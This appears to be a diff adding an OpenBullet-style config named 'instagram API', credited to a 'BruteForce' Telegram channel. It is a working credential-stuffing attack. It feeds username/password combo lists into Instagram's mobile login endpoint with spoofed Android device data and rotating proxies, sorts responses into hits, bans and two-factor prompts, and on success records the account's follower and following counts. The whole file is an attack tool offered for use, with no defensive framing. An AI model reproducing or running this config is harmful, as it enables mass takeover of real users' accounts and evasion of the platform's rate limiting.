@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "instagram API",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-20T17:34:59.331952+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | API Android | Capture Challenge & Followers & Followinng | CPM Rate:  100_2000 |",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://i.instagram.com/api/v1/accounts/login/" 
+  CONTENT "signed_body=252226e30fdc87721648d3665290a22b4eb7a8168498e44708afcdbfebd0de8d.{\"adid\":\"f71884fa-3179-4619-b573-f4043214fc5f\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"android-d78a8c1ce7ab6069\",\"google_tokens\":\"[]\",\"guid\":\"8c1689a4-b603-458b-871b-fad0a4e39735\",\"login_attempt_count\":0,\"password\":\"<PASS>\",\"phone_id\":\"df44390f-783d-4a90-aa1e-824540b294d7\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Instagram 43.0.0.9.97 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungexynos7870; pt_BR; 105430182)" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logged_in_user" 
+    KEY "checkpoint_challenge_required" 
+  KEYCHAIN Failure OR 
+    KEY "bad_password" 
+    KEY "invalid_user" 
+    KEY "unusable_password" 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_error" 
+    KEY "ip_block" 
+  KEYCHAIN Retry OR 
+    KEY "sentry_block" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "two_factor_required" 
+
+#Chal PARSE "<SOURCE>" JSON "error_type" -> VAR "Chal" 
+
+#Login PARSE "<SOURCE>" LR "{\"" "\": {\"pk\":" -> VAR "Log" 
+
+#Challenge FUNCTION Translate 
+  KEY "checkpoint_challenge_required" VALUE "Yes" 
+  KEY "logged_in_user" VALUE "No" 
+  "<Chal><Log>" -> CAP "Challenge" 
+
+#Info REQUEST GET "https://www.instagram.com/<USER>/?__a=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Followers PARSE "<SOURCE>" LR "\"edge_followed_by\":{\"count\":" "}," CreateEmpty=FALSE -> CAP "Followers" 
+
+#Following PARSE "<SOURCE>" LR "\"edge_follow\":{\"count\":" "}," CreateEmpty=FALSE -> CAP "Following" "" " | Telegram Channel: @BruteForce" 
+
